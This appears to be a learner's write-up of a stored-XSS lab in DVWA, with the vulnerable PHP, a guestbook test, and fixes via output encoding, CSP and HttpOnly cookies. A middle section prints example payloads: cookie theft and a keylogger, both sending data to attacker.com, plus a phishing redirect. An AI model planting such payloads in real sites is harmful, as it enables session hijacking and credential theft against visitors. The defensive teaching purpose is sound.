\# 03 - Stored XSS (DVWA, Low Security)



\## What I did

Navigated to the XSS (Stored) module in DVWA — a guestbook form with Name and

Message fields. Entered a normal name, and in the Message field entered:



`<script>alert('Stored XSS')</script>`



Clicked \*\*Sign Guestbook\*\*.



\## What happened

The browser executed the payload immediately on submission and displayed an alert

popup — identical to Reflected XSS so far. The critical difference: on reloading

the page, the alert fired again automatically without any further input.



This confirms the payload is now permanently stored in the database and executes

for every user who visits the guestbook page — not just the attacker.



!\[Stored XSS - Initial submission](./screenshots/xss-stored-result-1.png)

!\[Stored XSS - Fires again on reload](./screenshots/xss-stored-result-2.png)



\## Common Malicious JavaScript Payloads in Stored XSS



In a real attack, the payload is never just `alert('XSS')` — that's only used

to confirm the vulnerability exists. Once an attacker confirms storage and

execution, they replace it with something damaging. These are the most common

real-world payloads:



\### 1. Session Cookie Theft

```javascript



document.location='https://attacker.com/steal?cookie='+document.cookie;



```

Redirects the victim's browser to the attacker's server and appends their

session cookie to the URL. The attacker captures it in their server logs and

uses it to hijack the session — logging in as the victim without needing their

password. This is the most common real-world use of Stored XSS.



\### 2. Keylogger

```javascript



document.onkeypress = function(e) {

&#x20; new Image().src = 'https://attacker.com/log?key=' + e.key;

}



```

Silently records every keystroke on the page and sends each one to the

attacker's server — capturing passwords, credit card numbers, and any other

sensitive input typed while the malicious page is open.



\### 3. Silent Redirect to Phishing Page

```javascript

window.location='https://fake-login-page.com';

```

Immediately redirects every visitor to a fake login page that looks identical

to the real one. Victim types their credentials — attacker captures them.

Particularly dangerous on guestbook or forum pages where many users visit.



\## Root cause

The application applies `mysqli\_real\_escape\_string()` to both inputs before storing

them — this prevents SQL injection but does nothing to prevent XSS:



```php

$message = stripslashes( $message );

$message = mysqli\_real\_escape\_string($GLOBALS\["\_\_\_mysqli\_ston"], $message);

$name    = mysqli\_real\_escape\_string($GLOBALS\["\_\_\_mysqli\_ston"], $name);



$query = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";

$result = mysqli\_query($GLOBALS\["\_\_\_mysqli\_ston"], $query);

```



`mysqli\_real\_escape\_string()` escapes characters that would break a SQL query

(like single quotes) — it has no effect on HTML special characters like `<` and `>`.

So `<script>alert('Stored XSS')</script>` passes through the escaping intact,

gets stored in the database as-is, and is rendered as executable HTML every time

the page loads.



This is the critical distinction from Reflected XSS:



\- \*\*Reflected XSS\*\* — payload travels in the URL, only executes for the person

who clicks the malicious link, disappears when the page reloads.

\- \*\*Stored XSS\*\* — payload is saved to the database, executes automatically for

every visitor to the page, persists until someone manually removes it from the

database. No malicious link required — just visiting the page is enough.



In a real application, this could be used to steal session cookies from every

user who views the guestbook, redirect all visitors to a phishing site, or

silently perform actions on behalf of every authenticated user who loads the page.



\## Code-level fix

Apply `htmlspecialchars()` at the point of rendering output — not at the point

of storing to the database. The rule is: store raw data, encode on output.



```php

// When retrieving from database and rendering to page:

$message = htmlspecialchars( $row\["comment"], ENT\_QUOTES, 'UTF-8' );

$name    = htmlspecialchars( $row\["name"], ENT\_QUOTES, 'UTF-8' );

echo '<pre>' . $name . ' : ' . $message . '</pre>';

```



`htmlspecialchars()` converts `<` to `\&lt;` and `>` to `\&gt;` — the browser

displays these as literal characters instead of parsing them as HTML tags.

The script tag never executes.



\### Why encoding on input is not enough

Some developers try to strip or encode HTML on the way \*in\* (before storing).

This is fragile — it can break legitimate content (e.g. a user genuinely wants

to write about `<br>` tags in a tech forum), and different rendering contexts

require different encoding strategies. The correct approach is always: store

the original data, apply context-appropriate encoding at the point of output.



\### Defence-in-depth

Add a Content Security Policy header:



`Content-Security-Policy: script-src 'self'`



This blocks inline scripts entirely at the browser level — even if a stored

XSS payload reaches the page, the browser refuses to execute it. Combine with

`HttpOnly` cookies so session tokens can't be stolen via `document.cookie`

even if a script somehow executes.

